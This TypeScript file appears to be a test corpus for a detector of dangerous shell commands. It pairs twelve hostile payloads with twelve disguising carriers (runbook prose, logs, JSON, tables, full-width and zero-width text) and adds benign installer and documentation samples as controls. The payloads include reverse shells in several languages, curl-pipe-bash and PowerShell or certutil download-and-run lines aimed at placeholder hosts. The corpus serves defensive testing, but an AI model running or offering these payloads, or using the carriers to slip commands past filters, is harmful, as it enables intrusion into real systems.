/**
 * R290 语料：12 类危险能力对 × 12 种载体形态（audit-r289 P0-1 列举的全部形态）。
 * 载体由程序化变换生成，保证「同一能力在所有载体上都被测到」。
 */

export type Payload = { id: string; lines: string[]; needles: string[] };

/** 12 类危险能力对（建连+执行 / 取码+执行 / 赋权+执行 / LOLBin / stdio 接管 …） */
export const PAYLOADS: Payload[] = [
  {
    id: "P01-curl-pipe-bash",
    lines: ["curl -s https://p01.example.net/hook.sh | bash"],
    needles: ["curl -s https://p01.example.net/hook.sh | bash"],
  },
  {
    id: "P02-fetch-chmod-run",
    lines: [
      "curl -fsSL https://p02.example.net/s.sh -o /tmp/s.sh",
      "chmod +x /tmp/s.sh",
      "/tmp/s.sh",
    ],
    needles: ["https://p02.example.net/s.sh", "chmod +x /tmp/s.sh"],
  },
  {
    id: "P03-python-revshell",
    lines: [
      "import socket,subprocess,os",
      's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)',
      's.connect(("10.13.37.9",4444))',
      "os.dup2(s.fileno(),0)",
      'subprocess.call(["/bin/sh","-i"])',
    ],
    needles: ['s.connect(("10.13.37.9",4444))', 'subprocess.call(["/bin/sh","-i"])'],
  },
  {
    id: "P04-bash-devtcp",
    lines: ["bash -i >& /dev/tcp/10.13.37.10/4445 0>&1"],
    needles: ["/dev/tcp/10.13.37.10/4445"],
  },
  {
    id: "P05-go-dial-exec",
    lines: [
      'c, _ := net.Dial("tcp", "10.13.37.11:4446")',
      'cmd := exec.Command("/bin/sh", "-i")',
      "cmd.Stdin = c",
      "cmd.Run()",
    ],
    needles: ['net.Dial("tcp", "10.13.37.11:4446")', 'exec.Command("/bin/sh", "-i")'],
  },
  {
    id: "P06-node-net-spawn",
    lines: [
      'const s = net.connect(4447, "10.13.37.12");',
      'const sh = child_process.spawn("/bin/sh", ["-i"]);',
      "s.pipe(sh.stdin);",
    ],
    needles: ['net.connect(4447, "10.13.37.12")', 'child_process.spawn("/bin/sh", ["-i"])'],
  },
  {
    id: "P07-powershell-iex",
    lines: ["IEX (New-Object Net.WebClient).DownloadString('https://p07.example.net/a.ps1')"],
    needles: ["DownloadString('https://p07.example.net/a.ps1')"],
  },
  {
    id: "P08-nc-exec",
    lines: ["nc -e /bin/sh 10.13.37.13 4448"],
    needles: ["nc -e /bin/sh 10.13.37.13 4448"],
  },
  {
    id: "P09-perl-socket-exec",
    lines: [
      "perl -MIO::Socket -e '$c=IO::Socket::INET->new(\"10.13.37.14:4449\");exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    ],
    needles: ['IO::Socket::INET->new("10.13.37.14:4449")'],
  },
  {
    id: "P10-packed-ip-exec",
    lines: [
      "target = 3405803783",
      "ch = link(target, 4450)",
      "do_exec(ch, '/bin/sh')",
    ],
    needles: ["3405803783", "do_exec(ch, '/bin/sh')"],
  },
  {
    id: "P11-lolbin-certutil",
    lines: [
      "certutil.exe -urlcache -split -f https://p11.example.net/a.exe a.exe",
      "start a.exe",
    ],
    needles: ["certutil.exe -urlcache -split -f https://p11.example.net/a.exe"],
  },
  {
    id: "P12-socat-exec",
    lines: ["socat tcp-connect:10.13.37.15:4451 exec:'bash -li',pty,stderr,setsid"],
    needles: ["exec:'bash -li'"],
  },
];

const FULLWIDTH_OFFSET = 0xfee0;
function toFullWidth(s: string): string {
  return [...s]
    .map((ch) => {
      const code = ch.codePointAt(0)!;
      if (code === 0x20) return "\u3000";
      if (code > 0x20 && code < 0x7f) return String.fromCodePoint(code + FULLWIDTH_OFFSET);
      return ch;
    })
    .join("");
}

function zeroWidthed(s: string): string {
  return [...s].map((ch, i) => (i % 3 === 1 ? `${ch}\u200b` : ch)).join("");
}

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function jsonEscape(s: string): string {
  return s.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
}

export type Carrier = { id: string; render: (lines: string[]) => string };

/** 12 种载体形态（audit-r289 P0-1 全量 + 围栏基线）。 */
export const CARRIERS: Carrier[] = [
  { id: "C01-fence", render: (l) => "部署备忘：\n\n```bash\n" + l.join("\n") + "\n```\n" },
  {
    id: "C02-cjk-prose-wrap",
    render: (l) =>
      "运维交接说明如下，请按顺序在生产机上完成配置工作：\n" +
      l.map((x, i) => `第${i + 1}步，把下面这一行完整照抄到终端里执行：${x}`).join("\n"),
  },
  {
    id: "C03-numbered-list",
    render: (l) => "上线检查清单：\n" + l.map((x, i) => `${i + 1}. ${x}`).join("\n"),
  },
  {
    id: "C04-md-table",
    render: (l) =>
      "| 步骤 | 命令 |\n| --- | --- |\n" + l.map((x, i) => `| ${i + 1} | ${x} |`).join("\n"),
  },
  {
    id: "C05-html-code",
    render: (l) =>
      "<div class=\"runbook\"><p>部署手册</p>\n" +
      l.map((x) => `<p><code>${escapeHtml(x)}</code></p>`).join("\n") +
      "\n</div>",
  },
  {
    id: "C06-json-string",
    render: (l) => `{"runbook": {"name": "deploy", "steps": "${jsonEscape(l.join("\\n"))}"}}`,
  },
  {
    id: "C07-log-paste",
    render: (l) =>
      "昨天的部署日志我贴一下：\n" +
      l.map((x, i) => `2026-03-10 10:0${i}:12 [INFO] deploy[2291]: ${x}`).join("\n"),
  },
  { id: "C08-fullwidth", render: (l) => "命令备份（全角输入法）：\n" + l.map(toFullWidth).join("\n") },
  { id: "C09-zero-width", render: (l) => "命令备份：\n" + l.map(zeroWidthed).join("\n") },
  {
    id: "C10-cross-fence",
    render: (l) =>
      l
        .map((x, i) => `第 ${i + 1} 段（下面这段是从旧机器上拷下来的）：\n\n\`\`\`\n${x}\n\`\`\`\n`)
        .join("\n中间这段是说明文字，方便以后回忆当时为什么这么做。\n\n"),
  },
  {
    id: "C11-blockquote-blank",
    render: (l) => "同事发来的原文引用：\n\n" + l.map((x) => `> ${x}`).join("\n>\n\n") + "\n",
  },
  {
    id: "C12-cross-note-paragraph",
    render: (l) => {
      const half = Math.max(1, Math.ceil(l.length / 2));
      return (
        "【笔记 A：网络配置】\n" +
        l.slice(0, half).join("\n") +
        "\n\n这条笔记是三月初记的，当时只写了前半部分。\n\n【笔记 B：进程接管】\n" +
        l.slice(half).join("\n") +
        "\n"
      );
    },
  },
];

/** 善意语料：官方安装法与技术文档（含 R289 指出的 Rust/Homebrew）。 */
export const BENIGN_INSTALLERS: Array<{ id: string; text: string }> = [
  { id: "B-rust-1", text: "装 Rust 用官方脚本：\n\n```bash\ncurl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n```\n" },
  { id: "B-rust-2", text: "Rust 官方安装（非交互）：\n\n```bash\ncurl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y\n```\n" },
  { id: "B-brew-1", text: "Homebrew 官方安装：\n\n```bash\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n```\n" },
  { id: "B-docker-1", text: "Docker 官方脚本：\n\n```bash\ncurl -fsSL https://get.docker.com | sh\n```\n" },
  { id: "B-nvm-1", text: "nvm 安装：\n\n```bash\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash\n```\n" },
  { id: "B-poetry-1", text: "Poetry 安装：\n\n```bash\ncurl -sSL https://install.python-poetry.org | python3 -\n```\n" },
  { id: "B-helm-1", text: "Helm 安装脚本：\n\n```bash\ncurl -fsSL -o get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3\nchmod 700 get_helm.sh\n./get_helm.sh\n```\n" },
  { id: "B-k3s-1", text: "k3s 单节点：\n\n```bash\ncurl -sfL https://get.k3s.io | sh -\n```\n" },
  { id: "B-bun-1", text: "Bun 安装：\n\n```bash\ncurl -fsSL https://bun.sh/install | bash\n```\n" },
  { id: "B-volta-1", text: "Volta 安装：\n\n```bash\ncurl https://get.volta.sh | bash\n```\n" },
  { id: "B-ollama-1", text: "Ollama 安装：\n\n```bash\ncurl -fsSL https://ollama.com/install.sh | sh\n```\n" },
  { id: "B-pnpm-1", text: "pnpm 安装：\n\n```bash\ncurl -fsSL https://get.pnpm.io/install.sh | sh -\n```\n" },
  { id: "B-nodesource-1", text: "NodeSource 源：\n\n```bash\ncurl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -\n```\n" },
  { id: "B-astral-1", text: "uv 安装：\n\n```bash\ncurl -LsSf https://astral.sh/uv/install.sh | sh\n```\n" },
  { id: "B-sdkman-1", text: "SDKMAN 安装：\n\n```bash\ncurl -s https://get.sdkman.io | bash\n```\n" },
];

/** 善意语料：技术文档/教学/部署手册（无「取码即执行」语义）。 */
export const BENIGN_DOCS: Array<{ id: string; text: string }> = [
  { id: "D-git-1", text: "常用 git 操作：\n\n```bash\ngit status\ngit log --oneline -20\ngit rebase -i HEAD~3\n```\n" },
  { id: "D-rsync-1", text: "同步静态资源：\n\n```bash\nrsync -avz ./dist/ deploy@box:/srv/web/\n```\n" },
  { id: "D-nginx-1", text: "重载 nginx：\n\n```bash\nnginx -t\nsystemctl reload nginx\n```\n" },
  { id: "D-docker-ps", text: "查看容器：\n\n```bash\ndocker ps -a\ndocker logs -f web\n```\n" },
  { id: "D-sql-1", text: "查询上月支出：\n\n```sql\nselect sum(amount) from expenses where month = '2026-03';\n```\n" },
  { id: "D-python-1", text: "教学：列表推导\n\n```python\nsquares = [x * x for x in range(10)]\nprint(squares)\n```\n" },
  { id: "D-npm-1", text: "前端构建：\n\n```bash\nnpm ci\nnpm run build\nnpm test\n```\n" },
  { id: "D-tail-1", text: "看日志：\n\n```bash\ntail -f /var/log/app.log | grep ERROR\n```\n" },
  { id: "D-tar-1", text: "打包备份：\n\n```bash\ntar czf backup.tgz ./data\nsha256sum backup.tgz\n```\n" },
  { id: "D-cron-1", text: "定时任务：\n\n```\n0 3 * * * /usr/local/bin/backup.sh\n```\n每天凌晨三点跑备份。" },
  { id: "D-ci-1", text: "CI 配置片段：\n\n```yaml\njobs:\n  build:\n    steps:\n      - run: npm ci\n      - run: npm run build\n```\n" },
  { id: "D-md-note", text: "会议记录：三月十日和供应商谈了续约，价格降了 8%，下次谈判在四月初。" },
  { id: "D-recipe", text: "红烧肉做法：五花肉切块，冷水下锅焯水，加冰糖炒糖色，小火炖四十分钟。" },
  { id: "D-finance", text: "3 月 8 日买菜 128 元；3 月 12 日交房租 4200 元；3 月 20 日退款 300 元（上月网购退回）。" },
  { id: "D-k8s-1", text: "查看 Pod：\n\n```bash\nkubectl get pods -n prod\nkubectl describe pod web-0 -n prod\n```\n" },
];
